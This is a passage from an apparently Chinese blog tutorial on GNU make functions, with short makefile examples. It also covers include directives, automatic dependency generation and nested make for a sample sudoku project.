class="hljs-built_in">word</span> 3,<span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="wordlist"><a href="#wordlist" class="headerlink" title="wordlist"></a>wordlist</h4><p>用于返回文本指定范围内的单词列表</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">wordlist</span> start,end,text)</span><br>        --- start 起始位置，如果大于单词总数，则返回空串<br>        --- end 结束位置，如果大于单词总数，则返回起始位置之后全部，如果start &gt; end，什么都不返回<br><br>files = hello.cpp main.cpp test.cpp main.o hello.o hello.h main.cpp hello.cpp<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">wordlist</span> 3,6,<span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="words"><a href="#words" class="headerlink" title="words"></a>words</h4><p>返回文本中单词数</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(words text)</span><br>        --- text 需要处理的文本<br><br><br>files = hello.cpp main.cpp test.cpp main.o hello.o hello.h main.cpp hello.cpp<br>nums = <span class="hljs-variable">$(words <span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="firstword"><a href="#firstword" class="headerlink" title="firstword"></a>firstword</h4><p>返回第一个单词</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">firstword</span> text)</span><br></code></pre></td></tr></table></figure><h4 id="lastword"><a href="#lastword" class="headerlink" title="lastword"></a>lastword</h4><p>返回最后一个单词</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">lastword</span> text)</span><br></code></pre></td></tr></table></figure><h2 id="文件名处理函数"><a href="#文件名处理函数" class="headerlink" title="文件名处理函数"></a>文件名处理函数</h2><h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>返回文件目录</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">dir</span> files)</span><br>        --- files 需要返回目录的文件名，可以有多个，用空格隔开<br><br>files = src/hello.cpp main.cpp<br><br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> <span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="notdir"><a href="#notdir" class="headerlink" title="notdir"></a>notdir</h4><p>返回除目录部分的文件名</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> files)</span><br>        --- files 需要返回文件列表，可以有多个，用空格隔开<br><br>files = src/hello.cpp main.cpp<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">notdir</span> <span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="suffix"><a href="#suffix" class="headerlink" title="suffix"></a>suffix</h4><p>返回文件后缀名，如果没有后缀返回空</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">suffix</span> files)</span><br>        --- files 需要返回后缀的文件名，可以有多个，用空格隔开<br><br><br>files = src/hello.cpp main.cpp hello.o hello.hpp hello<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">suffix</span> <span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="basename"><a href="#basename" class="headerlink" title="basename"></a>basename</h4><p>返回文件名除后缀的部分</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">basename</span> files)</span><br>        --- files 需要返回的文件名，可以有多个，用空格隔开<br><br><br>files = src/hello.cpp main.cpp hello.o hello.hpp hello<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">basename</span> <span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="addsuffix"><a href="#addsuffix" class="headerlink" title="addsuffix"></a>addsuffix</h4><p>给文件名添加后缀</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">addsuffix</span> <span class="hljs-built_in">suffix</span>,files)</span><br>        --- suffix 需要添加的后缀<br>        --- files 需要添加后缀的文件名，可以有多个，用空格隔开<br><br>files = src/hello.cpp main.cpp hello.o hello.hpp hello<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">addsuffix</span> .exe,<span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="addprefix"><a href="#addprefix" class="headerlink" title="addprefix"></a>addprefix</h4><p>给文件名添加前缀</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> prefix,files)</span><br>        --- prefix 需要添加的前缀<br>        --- files 需要添加前缀的文件名，可以有多个，用空格隔开<br><br>files = src/hello.cpp main.cpp hello.o hello.hpp hello<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">addprefix</span> make/,<span class="hljs-variable">$(files)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>将两个列表中的内容一对一连接，如果两个列表内容数量不相等，则多出来的部分原样返回</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">join</span> list1,list2)</span><br>        --- list1 第一个列表<br>        --- list2 需要连接的第二个列表<br><br><br>f1 = hello main test<br>f2 = .cpp .hpp<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">join</span> <span class="hljs-variable">$(f1)</span>,<span class="hljs-variable">$(f2)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="wildcard"><a href="#wildcard" class="headerlink" title="wildcard"></a>wildcard</h4><p>返回符合通配符的文件列表</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> pattern)</span><br>        --- pattern 通配符<br><br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.cpp)</span><br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *)</span><br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> src/*.cpp)</span><br></code></pre></td></tr></table></figure><h4 id="realpath"><a href="#realpath" class="headerlink" title="realpath"></a>realpath</h4><p>返回文件的绝对路径</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">realpath</span> files)</span><br>        --- files 需要返回绝对路径的文件，可以有多个，用空格隔开<br><br>f3 = <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> src/*)</span><br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">realpath</span> <span class="hljs-variable">$(f3)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="abspath"><a href="#abspath" class="headerlink" title="abspath"></a>abspath</h4><p>返回绝对路径，用法同realpath，如果一个文件名不存在，realpath不会返回内容，abspath则会返回一个当前文件夹一下的绝对路径</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">abspath</span> files)</span><br></code></pre></td></tr></table></figure><h2 id="条件函数"><a href="#条件函数" class="headerlink" title="条件函数"></a>条件函数</h2><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>条伯判断，如果条件展开不是空串，则反回真的部分，否则返回假的部分</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">if</span> condition,then-part[,else-part])</span><br>        --- condition 条件部分<br>        --- then-part 条件为真时执行的部分<br>        --- else-part 条件为假时执行的部分，如果省略则为假时返回空串<br><br>files = src/hello.cpp main.cpp hello.o hello.hpp hello<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">if</span> <span class="hljs-variable">$(files)</span>,有文件,没有文件)</span><br></code></pre></td></tr></table></figure><h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><p>返回条件中第一个不为空的部分</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">or</span> condition1[,condition2[,condition3…]])</span><br><br>f1 = <br>f2 = <br>f3 = hello.cpp<br>f4 = main.cpp<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">or</span> <span class="hljs-variable">$(f1)</span>,<span class="hljs-variable">$(f2)</span>,<span class="hljs-variable">$(f3)</span>,<span class="hljs-variable">$(f4)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="and"><a href="#and" class="headerlink" title="and"></a>and</h4><p>如果条件中有一个为空串，则返回空，如果全都不为空，则返回最后一个条件</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">and</span> condition1[,condition2[,condition3…]])</span><br><br>f1 = 12<br>f2 = 34<br>f3 = hello.cpp<br>f4 = main.cpp<br>files2 = <span class="hljs-variable">$(<span class="hljs-built_in">and</span> <span class="hljs-variable">$(f1)</span>,<span class="hljs-variable">$(f2)</span>,<span class="hljs-variable">$(f3)</span>,<span class="hljs-variable">$(f4)</span>)</span><br></code></pre></td></tr></table></figure><h4 id="intcmp"><a href="#intcmp" class="headerlink" title="intcmp"></a>intcmp</h4><p>比较两个整数大小，并返回对应操作结果（GNU make 4.4以上版本）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(intcmp lhs,rhs[,lt-part[,eq-part[,gt-part]]])</span> <br>        --- lhs 第一个数<br>        --- rhs 第二个数<br>        --- lt-part  lhs &lt; rhs时执行<br>        --- eq-part  lhs = rhs时执行<br>        --- gt-part  lhs &gt; rhs时执行<br>        --- 如果只提供前两个参数，则lhs == rhs时返回数值，否则返回空串<br>            参数为lhs,rhs,lt-part时，当lhs &lt; rhs时返回lt-part结果，否则返回空<br>            参数为lhs,rhs,lt-part,eq-part，lhs &lt; rhs返回lt-part结果，否则都返回eq-part结果<br>            参数全时，lhs &lt; rhs返回lt-part，lhs == rhs返回eq-part, lhs &gt; rhs返回gt-part<br><br><br><br>@echo <span class="hljs-variable">$(intcmp 2,2,-1,0,1)</span><br></code></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>读写文件</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">file</span> op filename[,text])</span><br>        --- op 操作<br>                &gt; 覆盖<br>                &gt;&gt; 追加<br>                &lt; 读<br>        --- filename 需要操作的文件名<br>        --- text 写入的文本内容，读取是不需要这个参数<br><br><br>files = src/hello.cpp main.cpp hello.o hello.hpp hello<br>write = <span class="hljs-variable">$(<span class="hljs-built_in">file</span> &gt; makewrite.txt,<span class="hljs-variable">$(files)</span>)</span><br>read = <span class="hljs-variable">$(<span class="hljs-built_in">file</span> &lt; makewrite.txt)</span><br></code></pre></td></tr></table></figure><h2 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h2><p>对一列用空格隔开的字符序列中每一项进行处理，并返回处理后的列表</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> each,list,process)</span><br>        --- each list中的每一项<br>        --- list 需要处理的字符串序列，用空格隔开<br>        --- process 需要对每一项进行的处理<br><br>list = 1 2 3 4 5<br>result = <span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> each,<span class="hljs-variable">$(list)</span>,$(<span class="hljs-built_in">addprefix</span> cpp,$(<span class="hljs-built_in">addsuffix</span> .cpp,<span class="hljs-variable">$(each)</span>)</span>))<br></code></pre></td></tr></table></figure><p>作用类似C&#x2F;C++中的循环</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> list[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-type">int</span> result[<span class="hljs-number">5</span>];<br><span class="hljs-type">int</span> each;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>&#123;<br>    each = list[i];<br>    result[i] = <span class="hljs-built_in">process</span>(each);<br>&#125;<br><span class="hljs-comment">// 此时result即为返回结果</span><br></code></pre></td></tr></table></figure><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>将一些复杂的表达式写成一个变量，用call可以像调用函数一样进行调用。类似于编程语言中的自定义函数。在函数中可以用$(n)来访问第n个参数</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">call</span> funcname,param1,param2,…)</span><br>        --- funcname 自定义函数（变量名）<br>        --- 参数至少一个，可以有多个，用逗号隔开<br><br>dirof =  <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(<span class="hljs-built_in">realpath</span> $(1)</span>)) <span class="hljs-variable">$(<span class="hljs-built_in">dir</span> $(<span class="hljs-built_in">realpath</span> $(2)</span>))<br>result = <span class="hljs-variable">$(<span class="hljs-built_in">call</span> dirof,main.cpp,src/hello.cpp)</span><br></code></pre></td></tr></table></figure><h2 id="value"><a href="#value" class="headerlink" title="value"></a>value</h2><p>对于不是立即展开的变量，可以查看变量的原始定义；对于立即展开的变量，直接返回变量值</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">value</span> variable)</span><br><br>var = value function test<br>var2 = <span class="hljs-variable">$(var)</span><br>var3 := <span class="hljs-variable">$(var)</span><br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">value</span> var2)</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">value</span> var3)</span><br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>查看一个变量定义来源</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">origin</span> variable)</span><br><br><br>var2 = origin function <br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">origin</span> var1)</span>    <span class="hljs-comment"># undefined 未定义</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">origin</span> CC)</span>        <span class="hljs-comment"># default 默认变量</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">origin</span> JAVA_HOME)</span> <span class="hljs-comment"># environment 环境变量</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">origin</span> var2)</span>    <span class="hljs-comment"># file 在Makefile文件中定义的变量</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">origin</span> @)</span>        <span class="hljs-comment"># automatic 自动变量</span><br></code></pre></td></tr></table></figure><h2 id="flavor"><a href="#flavor" class="headerlink" title="flavor"></a>flavor</h2><p>查看一个变量的赋值方式</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">flavor</span> variable)</span><br><br>var2 = flavor function<br>var3 := flavor funciton<br><span class="hljs-section">all:</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">flavor</span> var1)</span>    <span class="hljs-comment"># undefined 未定义</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">flavor</span> var2)</span>    <span class="hljs-comment"># recursive 递归展开赋值</span><br>    @echo <span class="hljs-variable">$(<span class="hljs-built_in">flavor</span> var3)</span>    <span class="hljs-comment"># simple 简单赋值</span><br></code></pre></td></tr></table></figure><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>可以将一段文本生成Makefile的内容</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">eval</span> text)</span><br><br><span class="hljs-keyword">define</span> eval_target = <br><span class="hljs-section">eval:</span><br>    @echo Target Eval Test<br><span class="hljs-keyword">endef</span><br><br><span class="hljs-variable">$(<span class="hljs-built_in">eval</span> <span class="hljs-variable">$(eval_target)</span>)</span><br></code></pre></td></tr></table></figure><p>以上，运行make时将会执行eval目标</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>用于执行Shell命令</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">files = <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> ls *.cpp)</span><br><span class="hljs-variable">$(<span class="hljs-built_in">shell</span> echo This is from <span class="hljs-built_in">shell</span> function)</span><br></code></pre></td></tr></table></figure><h2 id="let"><a href="#let" class="headerlink" title="let"></a>let</h2><p>将一个字符串序列中的项拆开放入多个变量中，并对各个变量进行操作（GNU make 4.4以上版本）</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(let var1 [var2 ...],[list],proc)</span><br>        --- var 变量，可以有多个，用空格隔开<br>        --- list 待处理字符串，各项之间空格隔开<br>        --- proc 对变量进行的操作，结果为let的返回值<br>            将list中的值依次一项一项放到var中，如果var的个数多于list项数，那多出来的var是空串。如果<br>            var的个数小于list项数，则先依次把前而的项放入var中，剩下的list所有项都放入最后一个var中<br><br><br>list = a b c d<br>letfirst = <span class="hljs-variable">$(let first second rest,<span class="hljs-variable">$(list)</span>,<span class="hljs-variable">$(first)</span>)</span><br>letrest = <span class="hljs-variable">$(let first second rest,<span class="hljs-variable">$(list)</span>,<span class="hljs-variable">$(rest)</span>)</span><br><br><br><span class="hljs-comment"># 结合call可以对所有项进行递归处理</span><br>reverse = <span class="hljs-variable">$(let first rest,$(1)</span>,<span class="hljs-variable">$(<span class="hljs-built_in">if</span> <span class="hljs-variable">$(rest)</span>,$(<span class="hljs-built_in">call</span> reverse,<span class="hljs-variable">$(rest)</span>)</span> )<span class="hljs-variable">$(first)</span>)<br><span class="hljs-section">all: ; @echo $(call reverse,d c b a)</span><br></code></pre></td></tr></table></figure><h2 id="信息提示函数"><a href="#信息提示函数" class="headerlink" title="信息提示函数"></a>信息提示函数</h2><h4 id="error"><a href="#error" class="headerlink" title="error"></a>error</h4><p>提示错误信息并终止make执行</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">error</span> text)</span><br>        --- text 提示信息<br><br>EXIT_STATUS = -1<br><span class="hljs-keyword">ifneq</span> (0, <span class="hljs-variable">$(EXIT_STATUS)</span>)<br>    <span class="hljs-variable">$(<span class="hljs-built_in">error</span> An <span class="hljs-built_in">error</span> occured! make stopped!)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><h4 id="warning"><a href="#warning" class="headerlink" title="warning"></a>warning</h4><p>提示警告信息，make不会终止</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">warning</span> text)</span><br><br><span class="hljs-keyword">ifneq</span> (0, <span class="hljs-variable">$(EXIT_STATUS)</span>)<br>    <span class="hljs-variable">$(<span class="hljs-built_in">warning</span> This is a <span class="hljs-built_in">warning</span> message)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><h4 id="info"><a href="#info" class="headerlink" title="info"></a>info</h4><p>输出一些信息</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(info text…)</span><br><br><span class="hljs-variable">$(info 编译开始.......)</span><br><span class="hljs-variable">$(info 编译结束)</span><br></code></pre></td></tr></table></figure><h1 id="同一项目中有多个Makefile文件"><a href="#同一项目中有多个Makefile文件" class="headerlink" title="同一项目中有多个Makefile文件"></a>同一项目中有多个Makefile文件</h1><h2 id="包含其他makefile文件"><a href="#包含其他makefile文件" class="headerlink" title="包含其他makefile文件"></a>包含其他makefile文件</h2><p>使用<code>include</code>指令可以读入其他makefile文件的内容，效果就如同在include的位置用对应的文件内容替换一样。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">include</span> mkf1 mkf2 <span class="hljs-comment"># 可以引入多个文件，用空格隔开</span><br><span class="hljs-keyword">include</span> *.mk    <span class="hljs-comment"># 可以用通配符，表示引入所有以.mk结尾的文件</span><br></code></pre></td></tr></table></figure><p>如果找不到对应文件，则会报错，如果要忽略错误，可以在<code>include</code>前加<code>-</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">-include</span> mkf1 mkf2<br></code></pre></td></tr></table></figure><h4 id="应用实例：自动生成依赖"><a href="#应用实例：自动生成依赖" class="headerlink" title="应用实例：自动生成依赖"></a>应用实例：自动生成依赖</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs makefile">objs = block.o command.o input.o main.o scene.o test.o<br><br><span class="hljs-section">sudoku: <span class="hljs-variable">$(objs)</span></span><br>    g++ <span class="hljs-variable">$(objs)</span> -o sudoku<br><br><span class="hljs-keyword">include</span> $(objs:%.o=%.d)<br><br><span class="hljs-section">%.d: %.cpp</span><br>    @-rm <span class="hljs-variable">$@</span><br>    <span class="hljs-variable">$(CXX)</span> -MM  <span class="hljs-variable">$&lt;</span> &gt; <span class="hljs-variable">$@</span>.temp<br>    @sed &#x27;s,\(<span class="hljs-variable">$*</span>\)\.o[ :]*,\1.o <span class="hljs-variable">$@</span> : ,g&#x27; &lt; <span class="hljs-variable">$@</span>.temp &gt; <span class="hljs-variable">$@</span><br>    @-rm <span class="hljs-variable">$@</span>.temp<br><br><br>%.o : %.cpp<br>    g++ -c <span class="hljs-variable">$&lt;</span><br>    @echo <span class="hljs-variable">$^</span><br></code></pre></td></tr></table></figure><h2 id="嵌套make"><a href="#嵌套make" class="headerlink" title="嵌套make"></a>嵌套make</h2><p>如果将一个大项目分为许多小项目，则可以使用嵌套（递归）使用make。具体做法为，写一个总的Makefile，然后在每个子项目中都写一个Makefile，在总Makefile中进行调用。</p><p>例如，可以把sudoku项目中除main.cpp，test.cpp外的其他cpp存为一个子项目，编译为一个库文件，main.cpp test.cpp为另一个子项目，编译为.o然后链接库文件成可执行文件：</p><p>库文件Makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">vpath</span> %.h ../<span class="hljs-keyword">include</span><br><br>CXXFLAGS += -I../<span class="hljs-keyword">include</span> -fexec-charset=GBK -finput-charset=UTF-8<br><br>cpps := <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> *.cpp)</span><br>objs := $(cpps:%.cpp=%.o)<br><br><span class="hljs-section">libsudoku.a: <span class="hljs-variable">$(objs)</span></span><br>    ar rcs <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><br><br><span class="hljs-variable">$(objs)</span>: %.o : %.cpp %.h<br></code></pre></td></tr></table></figure><p>main.cpp test.cpp的Makefile</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code 